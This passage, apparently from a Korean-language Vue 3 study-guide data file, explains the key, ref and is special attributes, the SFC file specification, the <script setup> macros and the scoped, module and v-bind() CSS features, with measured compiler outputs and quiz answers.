      "참고서 특수 속성 페이지입니다. 셋. key: number | string | symbol. '가상 DOM diff 힌트. 없으면 제자리 패치, 있으면 key로 재배치. 사라진 key는 파괴. 형제 간 고유(중복은 렌더 에러)'. v-for에 :key=\"item.id\". 강제 교체(라이프사이클·Transition 유발): <transition><span :key=\"text\">. <template v-for>에도. ref: string | Function. Options는 this.$refs.x, Composition은 useTemplateRef('x'). 함수 꼴 :ref=\"(el) => …\". 요소면 DOM, 컴포넌트면 인스턴스. '마운트 뒤에만. $refs는 비반응이라 템플릿 바인딩 X'. is: string | Component. 동적 컴포넌트. 네이티브 요소에 is를 쓰면(3.1+) 커스터마이즈된 내장 요소로 취급. 'vue:' 접두(is=\"vue:my-row\")면 Vue 컴포넌트로 교체(in-DOM <table><tr>). 실제로 돌려 보면 key 변경으로 input 값 리셋, Transition :key로 요소 교체(둘 동시), v-if/else 같은 key 컴파일 에러, ref는 setup null·mounted 요소·v-for 배열·expose, is=\"vue:my-row\"가 in-DOM table 안에서 제자리. 이 노드의 질문은 하나입니다. 셋은 vnode에 무엇을 더하나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "속성    타입                           세부\nkey     number | string | symbol        diff 힌트 · 없으면 제자리 패치 · 형제 고유 (중복 → 에러) · v-for :key · 강제 교체 (훅 · Transition) · <template v-for> 에 · 원시값만\nref     string | Function               Options this.$refs.x · Composition useTemplateRef('x') · :ref=\"(el) => …\" (갱신마다 · 언마운트 null) · 요소 → DOM · 컴포넌트 → 인스턴스(expose) · 마운트 뒤 · $refs 비반응\nis      string | Component              <component :is> · 네이티브 요소에 is (3.1+) → 커스터마이즈된 내장 요소 · is=\"vue:name\" → Vue 컴포넌트로 교체 (in-DOM <table><tr>)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: <input :key=\"k\" value=\"초기\">에 사용자 입력 뒤 k 변경 → value '초기'(새 요소). <Transition><span :key=\"count\"> 변경 → span 둘(leave·enter), key 없는 <b>는 전환 없음. useTemplateRef: setup null → beforeMount null → mounted INPUT, v-for → 배열, 컴포넌트 → expose한 것만, 함수 ref → SPAN(언마운트 때 null). in-DOM <table><tr is=\"vue:my-row\"> → 제자리 컴포넌트, <table><my-row> → 밖으로. Node 컴파일: v-if/else 같은 key → 'v-if/else branches must use unique keys.', keyed v-for → KEYED_FRAGMENT 128. 자세한 맥락은 리스트·Transition·템플릿 ref·시작하기 노드.",
        code: "key 변경 → input '초기' (새 요소) · Transition :key → leave+enter 동시 · 같은 key 분기 → 컴파일 에러 · keyed v-for → 128\nref: setup/beforeMount null → mounted 요소 · v-for 배열 · 컴포넌트 expose 만 · 함수 ref 언마운트 null\nis=\"vue:my-row\" in <table><tr> → 제자리 컴포넌트",
        codeLang: "text",
      },
      {
        label: "문제의 구조: key 는 vnode 의 정체, ref 는 결과물의 손잡이, is 는 타입의 치환이다",
        body: "key는 diff가 '같은 노드인가'를 판단하는 정체라 리스트 짝짓기와 강제 교체 둘 다에 쓰이고 원시값이어야 합니다. ref는 렌더 결과(DOM·인스턴스)를 잡는 손잡이라 마운트 뒤에만 있고 비반응입니다. is는 vnode의 type을 런타임 값으로 바꾸는 것이고, 네이티브 요소 위의 is는 HTML 파서를 피해 컴포넌트를 끼우는 vue: 접두가 따로 있습니다.",
      },
      {
        label: "다음 입구",
        body: "다음 갈래 'SFC 참고서'는 .vue 파일의 문법 명세·<script setup>·CSS 기능입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 같은 자리의 <Form> 컴포넌트를 사용자 전환 시 완전히 초기화하려면? (2) 함수 ref에서 null이 들어와 에러입니다. (3) in-DOM 템플릿의 <ul>에 <li>를 컴포넌트로 바꾸려는데 밖으로 튕깁니다.",
        notes: [
          {
            title: "답",
            body: "(1) <Form :key=\"userId\" />. key가 바뀌면 같은 자리라도 새 vnode로 보아 옛 인스턴스를 언마운트하고 새로 마운트하므로 state·DOM이 전부 초기화됩니다(실제로 key 변경에 input 값 리셋, 라이프사이클 훅 재실행). Transition이 있으면 전환도 일어납니다. (2) 함수 ref는 요소가 붙을 때 요소로, 떼어질 때(언마운트·v-if false) null로 불립니다(문서). :ref=\"(el) => { if (el) map.set(id, el); else map.delete(id) }\"처럼 null 분기를 둡니다. 갱신마다 불릴 수 있으니 멱등하게 씁니다. (3) <ul> 안에 <my-item>을 두면 HTML 파서가 허용하지 않는 자식이라 밖으로 끌어냅니다(실제로 <table><my-row>가 밖으로). <li is=\"vue:my-item\">처럼 유효한 자식 태그에 is=\"vue:\" 접두로 컴포넌트를 지정하면 파서는 <li>로 받아들이고 Vue가 컴포넌트로 교체합니다. 접두 없는 is는 커스터마이즈된 내장 요소로 해석되니 꼭 vue:.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Built-in Special Attributes", href: `${DOCS}/api/built-in-special-attributes` },
      { label: "List Rendering — key", href: `${DOCS}/guide/essentials/list#maintaining-state-with-key` },
    ],
  },

  {
    id: "va-sfc",
    name: "SFC 참고서",
    tagline: ".vue 파일의 명세: 블록 규칙, <script setup> 매크로, scoped·module·v-bind() CSS",
    intro:
      "참고서 다섯째 갈래, 세 페이지입니다. 문법 명세(블록 종류·개수·이름 추론·전처리기·src·주석), <script setup>(컴파일러 매크로 defineProps·defineEmits·defineModel·defineExpose·defineOptions·defineSlots, 최상위 바인딩, 컴포넌트·디렉티브 사용, 최상위 await, generic, 제약), CSS 기능(scoped의 data-v 해시·:deep·:slotted·:global, CSS 모듈·useCssModule, v-bind()). 전부 런타임이 아니라 @vue/compiler-sfc의 일입니다. 실제로 돌려 보면 compileScript가 매크로를 props·emits 선언과 __props·__expose·_useModel로 바꿨고, compileStyle이 .a를 .a[data-v-abc123]으로, :deep(.b)를 .a[data-v-abc123] .b로, v-bind(size)를 var(--abc123-size)로 바꿨습니다.",
    blocks: [
      {
        label: "세 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지            항목                                                                                      측정 (compiler-sfc)\n문법 명세         <template> 1 · <script> 1 + <script setup> 1 · <style> N · 커스텀 블록 · 이름 추론 · lang · src(./) · 주석          parse → descriptor\n<script setup>    최상위 바인딩 노출 · defineProps/Emits/Model/Expose/Options/Slots · vXxx · 최상위 await(Suspense) · generic · src X   defineProps<T> → props 선언 · defineModel → _useModel · defineExpose → __expose · watch(구조분해) 에러\nCSS 기능          scoped(data-v-hash · 자식 루트 · :deep :slotted :global) · module($style · useCssModule) · v-bind()(CSS 변수)       .a[data-v-abc123] · .a[data-v-abc123] .b · div[data-v-abc123-s] · var(--abc123-size) · _useCssVars",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 'SFC 문법 명세'부터입니다.",
      },
    ],
    sources: [
      { label: "SFC Syntax Specification", href: `${DOCS}/api/sfc-spec` },
      { label: "<script setup>", href: `${DOCS}/api/sfc-script-setup` },
    ],
  },

  {
    id: "va-sfc-spec",
    name: "SFC 문법 명세",
    tagline: "<template> 하나, <script> 하나 + <script setup> 하나, <style> 여럿, 커스텀 블록 — 파일명이 name",
    intro:
      "참고서 SFC 문법 명세 페이지입니다. .vue 파일은 HTML 비슷한 문법으로 세 종류의 최상위 블록을 가집니다. <template>: 파일당 최대 하나. 렌더 함수로 컴파일. <script>: 보통 <script>는 최대 하나(<script setup> 제외). ES 모듈로 실행. default export가 옵션 객체 또는 defineComponent 결과. <script setup>: 최대 하나(보통 <script> 제외). setup()으로 컴파일되어 인스턴스마다 실행. <style>: 여럿 가능. scoped·module 속성, 한 컴포넌트에 섞어 쓸 수 있음. 커스텀 블록(<i18n>, <docs> 등)은 빌드 도구가 처리. 자동 이름 추론: 파일명에서 name(개발 경고·DevTools·재귀 참조. 명시 등록·import보다 낮은 우선순위). 전처리기: lang=\"ts\"·\"pug\"·\"scss\". src 임포트: <template src=\"./x.html\"> <script src> <style src>(상대 경로는 ./. npm 패키지 경로 OK. 커스텀 블록도. '별칭에서 ~로 시작하지 말 것. 모듈 요청으로 해석'). 주석은 블록 언어의 것, 최상위는 <!-- -->. 실제로 돌려 보면 parse(src, { filename })가 descriptor를 돌려주고 compileScript가 lang=\"ts\" <script setup>을 setup 함수로, compileStyle이 scoped 스타일을 해시 선택자로 바꿨습니다. 이 노드의 질문은 하나입니다. .vue 파일에 무엇을 몇 개 둘 수 있나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "블록             개수                      규칙\n<template>       최대 1                     render 로 컴파일 · lang=\"pug\" 등\n<script>         최대 1 (setup 제외)          ES 모듈 · default export = 옵션 | defineComponent · 한 번 실행 (모듈)\n<script setup>   최대 1 (보통 script 제외)      setup() 으로 컴파일 · 인스턴스마다 실행 · 보통 <script> 와 공존 가능\n<style>          N                          scoped · module · 섞어 쓰기 OK · lang=\"scss\" 등\n커스텀 블록       N                          <i18n> <docs> … 빌드 도구 플러그인이 처리\n\n이름 추론:  파일명 → name (FooBar.vue → <FooBar/> 재귀 가능 · 명시 등록·import 가 우선)\nsrc:       <template src=\"./x.html\"> · <style src=\"./x.css\"> · <script src=\"./x.js\"> · 상대는 ./ · 패키지 경로 OK · ~ 별칭 X\n주석:      블록 언어의 주석 · 최상위 <!-- -->",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node(@vue/compiler-sfc 3.5.45): parse(src, { filename: 'Comp.vue' }).descriptor로 블록을 받아 compileScript(descriptor, { id, inlineTemplate: true })하니 <script setup lang=\"ts\">가 export default { __name, props, emits, setup(__props, { expose, emit }) { … return (_ctx, _cache) => … } }로 바뀌었습니다. compileStyle({ source, filename, id: 'data-v-abc123', scoped: true })는 선택자에 해시 속성을 붙였습니다. 파일명이 name이 되는 것은 KeepAlive include 매칭(실제로 name으로 매칭)과 재귀 참조에 쓰입니다. 템플릿 하나·스크립트 하나 규칙은 compile 시 검사되어 어기면 에러입니다(측정 안 함). 자세한 맥락은 가이드 SFC·툴링 노드.",
        code: "parse(src, { filename }) → descriptor { template, script, scriptSetup, styles, customBlocks }\ncompileScript(descriptor, { id, inlineTemplate }) → export default { __name: 'Comp', props, emits, setup(__props, { expose, emit }) { … } }\ncompileStyle({ source, id: 'data-v-abc123', scoped: true }) → .a[data-v-abc123] { … }\n파일명 → name → KeepAlive include 매칭 ✓",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 블록 개수 규칙은 '컴포넌트 하나 = 렌더 하나 · 정의 하나 · 스타일 여럿' 이라는 응집 단위를 명세로 적은 것이다",
        body: "템플릿이 하나인 것은 컴포넌트의 렌더가 하나이기 때문이고, 보통 <script>가 하나인 것은 모듈의 default export가 하나이기 때문이며, <script setup>이 그와 공존하는 것은 '모듈 수준 한 번'과 '인스턴스 수준 매번'이 다른 일이기 때문입니다. 스타일은 여럿이어도 전부 이 컴포넌트의 것이라 제한이 없습니다. 파일명이 이름인 것은 파일이 곧 컴포넌트라는 단위의 표현입니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '<script setup>'은 매크로와 규칙입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <script setup>에 named export를 두고 싶습니다. (2) 스타일을 디자이너가 별도 파일로 관리합니다. (3) 한 파일에 작은 컴포넌트 둘을 두고 싶습니다.",
        notes: [
          {
            title: "답",
            body: "(1) <script setup>은 setup()으로 컴파일되어 export를 둘 수 없습니다. 같은 파일에 보통 <script>를 하나 더 두고 그곳에 export const helper = …를 둡니다(명세: 보통 1 + setup 1 공존). 모듈 수준에서 한 번만 실행할 부수 효과도 그쪽입니다. 단 props·emits처럼 setup 매크로로 되는 것은 보통 <script>에 중복해 두지 않습니다(경고). (2) <style scoped src=\"./Comp.css\"></style>로 외부 파일을 이 컴포넌트의 scoped 스타일로 끌어옵니다. 상대 경로는 ./로 시작해야 하고 ~ 별칭은 모듈 요청으로 해석됩니다. 컴파일러가 그 파일에도 data-v 해시를 붙입니다. (3) SFC는 default export(컴포넌트) 하나입니다. 보통 <script>에 named export로 두 번째 컴포넌트 객체를 적을 수는 있지만(템플릿은 문자열이나 렌더 함수) <template> 블록은 하나라 SFC의 이점이 없습니다. 파일을 둘로 나누는 것이 명세의 방향이고, 아주 작은 보조 컴포넌트는 함수형 컴포넌트로 보통 <script>에 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "SFC Syntax Specification", href: `${DOCS}/api/sfc-spec` },
      { label: "Single-File Components (Guide)", href: `${DOCS}/guide/scaling-up/sfc` },
    ],
  },

  {
    id: "va-sfc-script-setup",
    name: "<script setup>",
    tagline: "최상위 바인딩이 템플릿에 노출되고, defineProps·defineEmits·defineModel·defineExpose·defineOptions·defineSlots 는 import 없는 컴파일러 매크로다",
    intro:
      "참고서 <script setup> 페이지입니다. setup 속성을 붙이면 '컴포넌트 인스턴스마다 실행되는 setup()'으로 컴파일됩니다. 최상위 바인딩(변수·함수·import)이 템플릿에 노출되고 ref는 풀립니다. 컴포넌트는 import만으로 태그로(PascalCase 권장), 동적은 <component :is>, 재귀는 파일명(import가 우선), 네임스페이스 <Form.Input>. 디렉티브는 vXxx 이름. 매크로: defineProps·defineEmits(런타임 또는 타입 전용. 둘 동시 불가. '인자는 모듈 스코프로 끌어올려져 setup 로컬 변수 참조 불가'. 3.3+ import 타입·명명 튜플), defineModel(3.4+. default 어긋남 경고), defineExpose(기본 닫힘), defineOptions(3.3+), defineSlots(3.3+ 타입). useSlots·useAttrs. 보통 <script>와 공존(inheritAttrs·named export·일회 효과. 'props·emits를 거기 중복 X'). 최상위 await → async setup → Suspense 필수(실험적 경고). import 별칭(@/). generic 속성. 제약: src 속성 불가, in-DOM 루트 템플릿 불가. 실제로 돌려 보면 compileScript 출력에 매크로가 전부 사라지고 props·emits·setup(__props, { expose: __expose, emit: __emit })·_useModel·__expose가 생겼고, 구조 분해 prop을 watch에 값으로 넘기면 컴파일 에러였습니다. 이 노드의 질문은 하나입니다. 매크로는 각각 무엇으로 컴파일되나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                 컴파일 결과 / 규칙\n최상위 바인딩          템플릿에 노출 · ref 풀림 · import 도 (컴포넌트 · 유틸)\ndefineProps(…)        props 옵션 · 런타임 또는 <T>() 타입 전용 (동시 X) · 인자는 모듈 스코프 (로컬 변수 X) · 3.5 반응형 구조 분해 → __props.x\ndefineEmits(…)        emits 옵션 · 3.3+ { change: [id: number] } 튜플 · 반환 = emit\ndefineModel(…)        3.4+ · modelValue(또는 인자명) prop + update:x emit + useModel · [model, modifiers] · get/set · default 어긋남 경고\ndefineExpose({…})     expose · 기본 닫힘 · await 전에\ndefineOptions({…})    3.3+ · name · inheritAttrs 등 · 리터럴만\ndefineSlots<T>()      3.3+ · 타입 전용 · 반환 slots\nuseSlots() · useAttrs()   런타임 · context.slots/attrs\n보통 <script> 공존     inheritAttrs(또는 defineOptions) · named export · 일회 부수 효과 · props/emits 중복 X\n최상위 await          async setup() → Suspense 필수 (실험적)\ngeneric=\"T extends …\"  제네릭 컴포넌트 · <!-- @vue-generic --> · ComponentExposed\n제약                  src 속성 X · in-DOM 루트 템플릿 X",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node compileScript(3.5.45): const { msg = 'hi', count } = defineProps<{ msg?: string; count: number }>() → props: _mergeModels({ msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }, …). const model = defineModel<string>({ required: true }) → props에 modelValue·modelModifiers, emits에 update:modelValue, const model = _useModel<string>(__props, \"modelValue\"). defineEmits<{ change: [id: number] }>() → emits: [\"change\"], const emit = __emit. defineExpose({ model }) → __expose({ model }). 템플릿의 msg → __props.msg(인라인 렌더). watch(() => count) → watch(() => __props.count). watch(count) → '[@vue/compiler-sfc] \"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.' setup 시그니처 setup(__props: any, { expose: __expose, emit: __emit }). 자세한 맥락은 Props·컴포넌트 v-model·템플릿 ref·TS 노드.",
        code: "defineProps<{ msg?: string; count: number }>()  → props: { msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }\ndefineModel<string>({ required: true })          → modelValue · modelModifiers · update:modelValue · const model = _useModel(__props, \"modelValue\")\ndefineEmits<{ change: [id: number] }>()          → emits: [\"change\"] · const emit = __emit\ndefineExpose({ model })                           → __expose({ model })\n템플릿 msg → __props.msg · watch(() => count) → watch(() => __props.count)\nwatch(count) → compile error: \"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.",
        codeLang: "text",
      },
      {
        label: "문제의 구조: <script setup> 은 'setup() 을 손으로 쓰지 않게' 컴파일러가 대신 쓰는 것이라, 매크로의 제약은 전부 컴파일러의 제약이다",
        body: "최상위 바인딩이 노출되는 것은 컴파일러가 반환 객체(또는 인라인 렌더 함수)를 만들기 때문이고, 매크로가 import 없이 되는 것은 컴파일러가 그 호출을 찾아 옵션으로 바꾸기 때문입니다. 그래서 매크로는 최상위에서 정적으로 읽혀야 하고(함수 안·조건부 X), 인자는 setup 밖 옵션으로 가니 로컬 변수를 못 보며, 타입 전용 선언은 '정적으로 읽을 수 있는 타입'만 됩니다. 최상위 await는 setup을 async로 만들어 Suspense가 필요해지고, src·in-DOM이 안 되는 것도 컴파일 단위가 파일이기 때문입니다.",
      },
      {
        label: "다음 입구",
        body: "SFC 참고서의 마지막 'SFC CSS 기능'은 scoped·module·v-bind()입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) defineProps 안에서 setup의 상수를 default로 썼더니 에러입니다. (2) defineEmits를 if 블록 안에서 조건부로 선언했습니다. (3) <script setup>에서 컴포넌트 name을 바꾸고 싶습니다.",
        notes: [
          {
            title: "답",
            body: "(1) 매크로 인자는 모듈 스코프로 끌어올려져 props 옵션이 되므로 setup 안 로컬 변수를 참조할 수 없습니다(문서: 컴파일 에러. import는 가능). 상수를 별도 모듈에서 import하거나, 3.5 구조 분해 기본값 const { size = 'md' } = defineProps(…)처럼 리터럴로 적습니다. 실제로 3.5.45 compileScript는 일부 설정에서 통과시켰지만 규칙은 참조 금지입니다. (2) 매크로는 최상위에서 정적으로 읽혀야 합니다. 'defineEmits 매크로는 함수 안에서 쓸 수 없다'(문서)이고 조건부도 같습니다. 최상위에 한 번 선언하고 조건은 emit 호출 쪽에 둡니다. (3) 3.3+ defineOptions({ name: 'MyName', inheritAttrs: false }). 그 전 버전은 보통 <script>를 하나 더 두고 export default { name: 'MyName' }. 기본은 파일명 추론이라 파일명을 바꾸는 것이 가장 단순합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "<script setup>", href: `${DOCS}/api/sfc-script-setup` },
      { label: "Props — Reactive Props Destructure", href: `${DOCS}/guide/components/props#reactive-props-destructure` },
    ],
  },

  {
    id: "va-sfc-css",
    name: "SFC CSS 기능",
    tagline: "scoped 는 data-v 해시 속성 선택자, module 은 $style, v-bind() 는 CSS 변수",
    intro:
      "참고서 SFC CSS 기능 페이지입니다. 셋. <style scoped>: 컴포넌트 요소에 data-v-해시 속성을 붙이고 선택자마다 [data-v-해시]를 붙여 범위를 만듭니다. '자식 컴포넌트의 루트 노드는 부모·자식 scoped 모두의 영향'(설계). :deep(.b)로 자식 안쪽, :slotted(div)로 슬롯 내용, :global(.g)로 전역 한 줄. 팁: '요소 선택자(p)는 scoped에서 훨씬 느리니 class를', 재귀 컴포넌트의 자손 선택자 주의. v-html 내용은 scoped 안 먹음(:deep으로 가능). <style module>: CSS 모듈로 컴파일되어 $style.red로 접근(이름 해시). module=\"classes\"로 이름 바꾸기. useCssModule('classes')로 스크립트에서. v-bind(): CSS 값에 컴포넌트 상태를 바인딩. color: v-bind(color), 식은 따옴표 v-bind('theme.color'). 루트 요소의 인라인 CSS 변수로 컴파일되어 반응형. 실제로 돌려 보면 compileStyle(scoped, id 'data-v-abc123')이 .a → .a[data-v-abc123], .a :deep(.b) → .a[data-v-abc123] .b, :slotted(div) → div[data-v-abc123-s], :global(.g) → .g, v-bind(size) → var(--abc123-size), v-bind('theme.color') → var(--abc123-theme\\.color), 스크립트에 _useCssVars 추가. 이 노드의 질문은 하나입니다. 세 기능은 CSS를 무엇으로 바꾸나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "기능             쓰기                                   컴파일 결과 (측정 · id data-v-abc123)              세부\nscoped          .a { }                                  .a[data-v-abc123] { }                                요소에 data-v 속성 · 자식 루트도 영향 · 요소 선택자 느림\n  :deep()       .a :deep(.b) { }                        .a[data-v-abc123] .b { }                             자식 안쪽 · v-html 내용\n  :slotted()    :slotted(div) { }                       div[data-v-abc123-s] { }                             슬롯 내용 (부모 소유)\n  :global()     :global(.g) { }                         .g { }                                              전역 한 줄\nmodule          <style module> .red { }                 해시 클래스 · $style.red                             module=\"classes\" → classes.red · useCssModule('classes')\nv-bind()        p { font-size: v-bind(size) }           p[data-v-abc123] { font-size: var(--abc123-size) }   루트 인라인 CSS 변수 · 반응형 · 식은 따옴표 v-bind('theme.color') → var(--abc123-theme\\.color)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node compileStyle({ source, filename: 'S.vue', id: 'data-v-abc123', scoped: true })의 출력은 .a[data-v-abc123] { color: red } .a[data-v-abc123] .b { color: blue } div[data-v-abc123-s] { margin: 0 } .g { padding: 0 } p[data-v-abc123] { font-size: var(--abc123-size) } .c[data-v-abc123] { color: var(--abc123-theme\\.color) }. SFC 전체를 compileScript(inlineTemplate)하니 import { useCssVars as _useCssVars, unref as _unref } from 'vue'와 setup 안 _useCssVars(_ctx => ({ … }))가 추가되어 v-bind() 값을 루트 요소의 인라인 CSS 변수로 넣습니다. v-html 내용에 scoped가 안 먹는 것과 Teleport·슬롯 내용이 부모 소유인 것은 가이드 노드의 측정·문서. 자세한 맥락은 SFC·슬롯·클래스와 스타일 노드.",
        code: "// compileStyle (scoped · data-v-abc123)\n.a { color: red }                 → .a[data-v-abc123] { color: red }\n.a :deep(.b) { color: blue }      → .a[data-v-abc123] .b { color: blue }\n:slotted(div) { margin: 0 }       → div[data-v-abc123-s] { margin: 0 }\n:global(.g) { padding: 0 }        → .g { padding: 0 }\np { font-size: v-bind(size) }     → p[data-v-abc123] { font-size: var(--abc123-size) }\n.c { color: v-bind('theme.color') } → .c[data-v-abc123] { color: var(--abc123-theme\\.color) }\n// compileScript: import { useCssVars } · _useCssVars(_ctx => ({ … }))",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 셋은 '선택자에 표식을 붙이기(scoped) · 클래스 이름을 바꾸기(module) · 값을 변수로 빼기(v-bind)' 로, 전부 컴파일 타임 치환이다",
        body: "scoped는 선택자의 마지막 복합 선택자에 [data-v-해시]를 붙이고 요소에 같은 속성을 붙여 '이 컴포넌트의 요소'로 범위를 만듭니다. 그래서 자식 루트는 부모 속성도 받고(둘 다 영향), 자식 안쪽·슬롯·v-html은 속성이 없어 :deep·:slotted이 필요하며, 요소 선택자는 p[data-v-…]가 되어 브라우저가 모든 p를 검사해 느립니다. module은 클래스 이름 자체를 해시로 바꾸고 매핑 객체를 줍니다. v-bind()는 값 자리를 var(--해시-이름)으로 바꾸고 런타임이 루트에 그 변수를 인라인으로 넣어 반응형으로 갱신합니다.",
      },
      {
        label: "다음 입구",
        body: "다음 갈래 '고급 API'는 커스텀 엘리먼트·렌더 함수·SSR·유틸리티 타입·커스텀 렌더러·컴파일 타임 플래그입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 자식 컴포넌트의 .title을 부모 scoped 스타일로 바꾸려 합니다. (2) 테마 색을 props로 받아 CSS에 넣으려 합니다. (3) scoped인데 p { } 선택자가 많아 느립니다.",
        notes: [
          {
            title: "답",
            body: "(1) 부모의 .card .title[data-v-부모]는 자식 안쪽 .title에 부모 속성이 없어 안 맞습니다(자식 루트에만 있음). .card :deep(.title) { … }로 쓰면 .card[data-v-부모] .title로 컴파일되어(실제로 확인) 자식 안쪽까지 닿습니다. 자식이 바뀌어도 부모 스타일이 침범하니 꼭 필요한 곳에만. (2) <style scoped> .box { background: v-bind(color) }처럼 v-bind()에 props 변수를 넣습니다. props.color면 v-bind('props.color')로 따옴표(실제로 식은 var(--hash-theme\\.color)). 컴파일러가 루트 요소에 인라인 CSS 변수를 넣고 반응형으로 갱신하므로 :style 바인딩 없이 CSS 안에서 씁니다. (3) 문서의 팁입니다. scoped 요소 선택자는 p[data-v-hash]로 컴파일되어 브라우저가 모든 p에 속성 검사를 해 느립니다. .text처럼 클래스 선택자로 바꾸면 .text[data-v-hash]로 해당 요소만 봅니다. 스타일 가이드 D '요소 선택자 with scoped' 항목이 같은 내용입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "SFC CSS Features", href: `${DOCS}/api/sfc-css-features` },
      { label: "Style Guide — Element selectors with scoped", href: `${DOCS}/style-guide/rules-use-with-caution#element-selectors-with-scoped` },
    ],
  },

  {
    id: "va-advanced",
    name: "고급 API",
    tagline: "경계 밖으로 가는 여섯: 커스텀 엘리먼트, 렌더 함수 API, SSR API, TS 유틸리티 타입, 커스텀 렌더러, 컴파일 타임 플래그",
    intro:
      "참고서 마지막 갈래, 여섯 페이지입니다. 커스텀 엘리먼트(defineCustomElement 옵션·useHost·useShadowRoot), 렌더 함수 API(h·mergeProps·cloneVNode·isVNode·resolveComponent·resolveDirective·withDirectives·withModifiers), SSR API(renderToString·renderToNodeStream·pipeToNodeWritable·renderToWebStream·pipeToWebWritable·renderToSimpleStream·useSSRContext·data-allow-mismatch), 유틸리티 타입(PropType·MaybeRef·MaybeRefOrGetter·ExtractPropTypes·ExtractPublicPropTypes·ComponentCustomProperties·ComponentCustomOptions·ComponentCustomProps·CSSProperties), 커스텀 렌더러(createRenderer의 노드 ops), 컴파일 타임 플래그(__VUE_OPTIONS_API__·__VUE_PROD_DEVTOOLS__·__VUE_PROD_HYDRATION_MISMATCH_DETAILS__). 실제로 돌려 보면 renderToString·renderToWebStream·useSSRContext·ctx.teleports·data-allow-mismatch, h()와 resolveComponent, 커스텀 엘리먼트 태그의 서버 렌더를 확인했습니다.",
    blocks: [
      {
        label: "여섯 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지            항목                                                                                                   측정\n커스텀 엘리먼트     defineCustomElement(comp, { styles, shadowRoot(3.5+), nonce(3.5+), configureApp(3.5+) }) · useHost · useShadowRoot · $host   <my-el class> 서버 렌더 (객체 prop 미출력)\n렌더 함수 API      h · mergeProps · cloneVNode · isVNode · resolveComponent · resolveDirective · withDirectives · withModifiers              h() 로 전부 · resolveComponent 경고\nSSR API           renderToString · renderToNodeStream · pipeToNodeWritable · renderToWebStream · pipeToWebWritable · renderToSimpleStream · useSSRContext · data-allow-mismatch   renderToString · WebStream 1청크 · ctx.title · teleports · 불일치 억제\n유틸리티 타입       PropType · MaybeRef · MaybeRefOrGetter · ExtractPropTypes · ExtractPublicPropTypes · ComponentCustomProperties · ComponentCustomOptions · ComponentCustomProps · CSSProperties   (타입)\n커스텀 렌더러       createRenderer({ patchProp, insert, remove, createElement, createText, createComment, setText, setElementText, parentNode, nextSibling, querySelector?, setScopeId?, cloneNode?, insertStaticContent? })   (문서)\n컴파일 타임 플래그   __VUE_OPTIONS_API__(true) · __VUE_PROD_DEVTOOLS__(false) · __VUE_PROD_HYDRATION_MISMATCH_DETAILS__(false · 3.4+)   esm-bundler 만 · 빌드 크기 576KB vs 178KB",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '커스텀 엘리먼트'부터입니다.",
      },
    ],
    sources: [
      { label: "Custom Elements API", href: `${DOCS}/api/custom-elements` },
      { label: "Server-Side Rendering API", href: `${DOCS}/api/ssr` },
    ],
  },

  {
    id: "va-adv-custom-elements",
    name: "커스텀 엘리먼트",
    tagline: "defineCustomElement(component, { styles, shadowRoot, nonce, configureApp }) · useHost · useShadowRoot · this.$host",
    intro:
      "참고서 커스텀 엘리먼트 API 페이지입니다. defineCustomElement(component, options?) → CustomElementConstructor. component는 defineComponent와 같은 인자. options: styles(섀도 루트에 주입할 CSS 문자열 배열), shadowRoot(3.5+. 기본 true. false면 섀도 루트 없음 → <style> 격리 사라짐), nonce(3.5+. 주입 style 태그에), configureApp(3.5+. 내부 앱 인스턴스 설정. app.use 등). 'SFC와 함께 쓰려면 특별 설정(.ce.vue)'. useHost() → 호스트 요소, useShadowRoot() → 섀도 루트, this.$host(Options). 등록은 customElements.define('my-el', Ctor). 실제로 돌려 보면 대시 태그는 서버 렌더에서 커스텀 엘리먼트로 취급되어 class 그대로·객체 prop 미출력이었고, defineCustomElement 자체는 돌리지 않았습니다. JS 노드 26장의 섀도 DOM 측정(CSS 양방향 차단, 이벤트 재지정)이 이 요소에 적용됩니다. 이 노드의 질문은 하나입니다. 옵션 넷과 헬퍼 셋은 무엇을 정하나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                                시그니처 / 뜻                                       세부\ndefineCustomElement(comp, opts?)     CustomElementConstructor                             comp = defineComponent 인자 · customElements.define 으로 등록\n  opts.styles                        string[]                                             섀도 루트에 <style> 주입 · .ce.vue 는 자동\n  opts.shadowRoot                    boolean (기본 true · 3.5+)                             false → 섀도 루트 없음 · 스타일 격리 X\n  opts.nonce                         string (3.5+)                                        주입 style 의 nonce (CSP)\n  opts.configureApp                  (app) => void (3.5+)                                 내부 앱에 app.use · provide · config\nuseHost()                            HTMLElement (3.5+)                                   호스트 